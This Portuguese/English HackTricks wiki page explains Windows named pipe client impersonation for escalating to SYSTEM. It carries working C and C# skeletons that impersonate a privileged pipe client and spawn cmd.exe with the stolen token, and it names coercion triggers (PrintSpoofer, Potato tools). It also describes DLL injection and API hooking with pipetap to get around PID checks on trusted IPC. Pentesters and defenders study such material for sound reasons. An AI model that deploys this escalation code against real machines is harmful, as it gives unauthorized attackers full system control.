# Named Pipe Client Impersonation

{{#include ../../banners/hacktricks-training.md}}

Named Pipe client impersonation é uma primitiva de elevação de privilégio local que permite que uma thread de servidor de named-pipe adote o contexto de segurança de um cliente que se conecta a ela. Na prática, um atacante que consegue executar código com SeImpersonatePrivilege pode coagir um cliente privilegiado (por exemplo, um serviço SYSTEM) a conectar-se a um pipe controlado pelo atacante, chamar ImpersonateNamedPipeClient, duplicar o token resultante em um token primário e criar um processo como o cliente (frequentemente NT AUTHORITY\SYSTEM).

Esta página foca na técnica central. Para cadeias de exploit ponta-a-ponta que forçam SYSTEM a conectar ao seu pipe, veja as páginas da família Potato referenciadas abaixo.

## TL;DR
- Create a named pipe: \\.\pipe\<random> e aguarde uma conexão.
- Faça um componente privilegiado conectar-se a ele (spooler/DCOM/EFSRPC/etc.).
- Leia pelo menos uma mensagem do pipe, então chame ImpersonateNamedPipeClient.
- Abra o token de impersonação da thread atual, DuplicateTokenEx(TokenPrimary), e use CreateProcessWithTokenW/CreateProcessAsUser para obter um processo SYSTEM.

## Requisitos e APIs principais
- Privilégios tipicamente necessários pelo processo/thread chamador:
- SeImpersonatePrivilege para impersonar com sucesso um cliente que se conecta e para usar CreateProcessWithTokenW.
- Alternativamente, após impersonar SYSTEM, você pode usar CreateProcessAsUser, o que pode requerer SeAssignPrimaryTokenPrivilege e SeIncreaseQuotaPrivilege (estes são satisfeitos quando você está impersonando SYSTEM).
- APIs principais usadas:
- CreateNamedPipe / ConnectNamedPipe
- ReadFile/WriteFile (é necessário ler pelo menos uma mensagem antes da impersonação)
- ImpersonateNamedPipeClient e RevertToSelf
- OpenThreadToken, DuplicateTokenEx(TokenPrimary)
- CreateProcessWithTokenW ou CreateProcessAsUser
- Impersonation level: para executar ações úteis localmente, o cliente deve permitir SecurityImpersonation (padrão para muitos clientes RPC/named-pipe locais). Clientes podem reduzir isso com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION ao abrir o pipe.

## Fluxo Win32 mínimo (C)
```c
// Minimal skeleton (no error handling hardening for brevity)
#include <windows.h>
#include <stdio.h>

int main(void) {
LPCSTR pipe = "\\\\.\\pipe\\evil";
HANDLE hPipe = CreateNamedPipeA(
pipe,
PIPE_ACCESS_DUPLEX,
PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
1, 0, 0, 0, NULL);

if (hPipe == INVALID_HANDLE_VALUE) return 1;

// Wait for privileged client to connect (see Triggers section)
if (!ConnectNamedPipe(hPipe, NULL)) return 2;

// Read at least one message before impersonation
char buf[4]; DWORD rb = 0; ReadFile(hPipe, buf, sizeof(buf), &rb, NULL);

// Impersonate the last message sender
if (!ImpersonateNamedPipeClient(hPipe)) return 3; // ERROR_CANNOT_IMPERSONATE==1368

// Extract and duplicate the impersonation token into a primary token
HANDLE impTok = NULL, priTok = NULL;
if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &impTok)) return 4;
if (!DuplicateTokenEx(impTok, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &priTok)) return 5;

// Spawn as the client (often SYSTEM). CreateProcessWithTokenW requires SeImpersonatePrivilege.
STARTUPINFOW si = { .cb = sizeof(si) }; PROCESS_INFORMATION pi = {0};
if (!CreateProcessWithTokenW(priTok, LOGON_NETCREDENTIALS_ONLY,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
0, NULL, NULL, &si, &pi)) {
// Fallback: CreateProcessAsUser after you already impersonated SYSTEM
CreateProcessAsUserW(priTok, L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL,
NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
}

RevertToSelf(); // Restore original context
return 0;
}
```
Notes:
- Se ImpersonateNamedPipeClient retornar ERROR_CANNOT_IMPERSONATE (1368), certifique-se de ler do pipe primeiro e de que o cliente não restringiu a impersonação ao nível Identification.
- Prefira DuplicateTokenEx com SecurityImpersonation e TokenPrimary para criar um token primário adequado para a criação de processos.

## Exemplo rápido em .NET
Em .NET, NamedPipeServerStream pode impersonar via RunAsClient. Uma vez impersonando, duplique o token da thread e crie um processo.
```csharp
using System; using System.IO.Pipes; using System.Runtime.InteropServices; using System.Diagnostics;
class P {
[DllImport("advapi32", SetLastError=true)] static extern bool OpenThreadToken(IntPtr t, uint a, bool o, out IntPtr h);
[DllImport("advapi32", SetLastError=true)] static extern bool DuplicateTokenEx(IntPtr e, uint a, IntPtr sd, int il, int tt, out IntPtr p);
[DllImport("advapi32", SetLastError=true, CharSet=CharSet.Unicode)] static extern bool CreateProcessWithTokenW(IntPtr hTok, int f, string app, string cmd, int c, IntPtr env, string cwd, ref ProcessStartInfo si, out Process pi);
static void Main(){
using var s = new NamedPipeServerStream("evil", PipeDirection.InOut, 1);
s.WaitForConnection();
// Ensure client sent something so the token is available
s.RunAsClient(() => {
IntPtr t; if(!OpenThreadToken(Process.GetCurrentProcess().Handle, 0xF01FF, false, out t)) return; // TOKEN_ALL_ACCESS
IntPtr p; if(!DuplicateTokenEx(t, 0xF01FF, IntPtr.Zero, 2, 1, out p)) return; // SecurityImpersonation, TokenPrimary
var psi = new ProcessStartInfo("C\\Windows\\System32\\cmd.exe");
Process pi; CreateProcessWithTokenW(p, 2, null, null, 0, IntPtr.Zero, null, ref psi, out pi);
});
}
}
```
## Gatilhos/coerções comuns para levar o SYSTEM ao seu named pipe
Essas técnicas forçam serviços privilegiados a conectar-se ao seu named pipe para que você possa se passar por eles:
- Print Spooler RPC trigger (PrintSpoofer)
- DCOM activation/NTLM reflection variants (RoguePotato/JuicyPotato[NG], GodPotato)
- EFSRPC pipes (EfsPotato/SharpEfsPotato)

Veja uso detalhado e compatibilidade aqui:

-
{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}
-
{{#ref}}
juicypotato.md
{{#endref}}

Se você só precisa de um exemplo completo de como criar o pipe e se passar por outro processo para spawnar SYSTEM a partir de um gatilho de serviço, veja:

-
{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}
-
{{#ref}}
service-triggers.md
{{#endref}}

## Named Pipe IPC Abuse & MITM (DLL Injection, API Hooking, PID Validation Bypass)

Named-pipe hardened services can still be hijacked by instrumenting the trusted client. Tools like [pipetap](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/) drop a helper DLL into the client, proxy its traffic, and let you tamper with privileged IPC before the SYSTEM service consumes it.

### Inline API hooking inside trusted processes
- Injete a DLL auxiliar (OpenProcess → CreateRemoteThread → LoadLibrary) em qualquer cliente.
- A DLL usa Detours em `ReadFile`, `WriteFile`, etc., mas somente quando `GetFileType` reporta `FILE_TYPE_PIPE`; copia cada buffer/metadata para um control pipe, permite editar/descartar/reproduzir, e então retoma a API original.
- Transforma o cliente legítimo em um proxy estilo Burp: pause payloads UTF-8/UTF-16/raw, acione caminhos de erro, reproduza sequências ou exporte traces JSON.

### Remote client mode to defeat PID-based validation
- Injete em um cliente allow-listed, depois na GUI escolha o pipe e esse PID.
- A DLL chama `CreateFile`/`ConnectNamedPipe` dentro do processo confiável e retransmite o I/O de volta para você, assim o servidor ainda vê o PID/imagem legítima.
- Contorna filtros que dependem de `GetNamedPipeClientProcessId` ou verificações de imagem assinada.

### Fast enumeration and fuzzing
- `pipelist` enumera `\\.\pipe\*`, mostra ACLs/SIDs, e encaminha entradas para outros módulos para sondagem imediata.
- O cliente de pipe/compositor de mensagens conecta-se a qualquer nome e constrói payloads UTF-8/UTF-16/raw-hex; importe blobs capturados, modifique campos e reenvie para procurar desserializadores ou verbos de comando não autenticados.
- A DLL auxiliar pode hospedar um listener TCP loopback para que ferramentas/fuzzers possam controlar o pipe remotamente via o Python SDK.
```bash
pip install pipetap
```

```python
import pipetap
client = pipetap.Client(("127.0.0.1", 47001))
client.write(b"OP\x00\x01...")
```
Combine a ponte TCP com restaurações de snapshot da VM para forçar falhas em analisadores frágeis de IPC.

### Considerações operacionais
- Named pipes têm baixa latência; longas pausas ao editar buffers podem causar deadlock em serviços frágeis.
- A cobertura de Overlapped/completion-port I/O é parcial, então espere casos de borda.
- Injection é ruidosa e não assinada; trate-a como um auxiliar de laboratório/exploit-dev em vez de um stealth implant.

## Solução de problemas e armadilhas
- Você deve ler ao menos uma mensagem do pipe antes de chamar ImpersonateNamedPipeClient; caso contrário, receberá ERROR_CANNOT_IMPERSONATE (1368).
- Se o cliente conectar-se com SECURITY_SQOS_PRESENT | SECURITY_IDENTIFICATION, o servidor não consegue realizar impersonation completo; verifique o nível de impersonation do token via GetTokenInformation(TokenImpersonationLevel).
- CreateProcessWithTokenW requer SeImpersonatePrivilege no chamador. Se isso falhar com ERROR_PRIVILEGE_NOT_HELD (1314), use CreateProcessAsUser depois de já ter se impersonado como SYSTEM.
- Garanta que o security descriptor do seu pipe permita que o serviço alvo se conecte caso você o endureça; por padrão, pipes sob \\.\pipe são acessíveis de acordo com o DACL do servidor.

## Referências
- [Windows: ImpersonateNamedPipeClient documentation](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-impersonatenamedpipeclient)
- [ired.team: Windows named pipes privilege escalation](https://ired.team/offensive-security/privilege-escalation/windows-namedpipes-privilege-escalation)
- [pipetap – a Windows named pipe proxy tool](https://sensepost.com/blog/2025/pipetap-a-windows-named-pipe-proxy-tool/)

{{#include ../../banners/hacktricks-training.md}}
